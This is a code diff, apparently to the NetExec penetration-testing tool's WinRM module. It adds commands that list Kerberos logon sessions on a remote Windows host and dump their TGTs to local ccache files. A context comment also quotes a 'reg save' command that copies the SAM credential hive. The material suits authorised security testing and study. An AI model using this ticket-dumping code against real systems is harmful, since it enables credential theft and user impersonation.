@@ -20,6 +20,7 @@ from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.dpapi import DPAPITriage
 from nxc.helpers.misc import gen_random_string, sanitize_dns
+from nxc.helpers.klist import parse_klist_sessions, collect_tgts, select_sessions, write_ccache, fmt_ticket_time, ccache_path
 from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.logger import NXCAdapter
 
@@ -339,6 +340,47 @@ class winrm(connection):
         if out is not None:
             for line in out.splitlines():
                 self.logger.highlight(line.rstrip())
+
+    def klist(self):
+        output = self.execute("klist sessions", True)
+        if not output:
+            self.logger.fail("Failed to enumerate Kerberos sessions")
+            return
+        sessions = parse_klist_sessions(output)
+        tgts = collect_tgts(sessions, lambda cmd: self.execute(cmd, True), self.logger)
+        if not tgts:
+            self.logger.fail("No Kerberos TGTs found")
+            return
+        self.logger.success(f"Found {len(tgts)} TGT(s)")
+        width = max(len(account) for _, account, _ in tgts)
+        for i, (logon_hex, account, info) in enumerate(tgts, 1):
+            self.logger.highlight(f"  [{i}] {account:<{width}}  {logon_hex}  (expires {fmt_ticket_time(info['end_time'])})")
+
+    def klist_dump(self):
+        output = self.execute("klist sessions", True)
+        if not output:
+            self.logger.fail("Failed to enumerate Kerberos sessions")
+            return
+        sessions = parse_klist_sessions(output)
+        tgts = collect_tgts(sessions, lambda cmd: self.execute(cmd, True), self.logger)
+        tgts, error = select_sessions(tgts, self.args.klist_dump)
+        if error:
+            self.logger.fail(error)
+            return
+        if not tgts:
+            self.logger.fail("No valid TGTs dumped")
+            return
+
+        output_prefix = self.output_file_template.format(output_folder="klist")
+        os.makedirs(os.path.dirname(output_prefix), exist_ok=True)
+
+        written = []
+        for logon_hex, account, info in tgts:
+            path = ccache_path(output_prefix, info["client"], info["realm"], logon_hex)
+            write_ccache(info, path)
+            written.append(path)
+            self.logger.highlight(f"{account}  (expires {fmt_ticket_time(info['end_time'])})")
+        self.logger.success(f"Dumped {len(written)} TGT(s) to {os.path.dirname(output_prefix)}")
 
     # Dos attack prevent:
     # if someboby executed "reg save HKLM\sam C:\windows\temp\sam" before, but didn't remove "C:\windows\temp\sam" file,
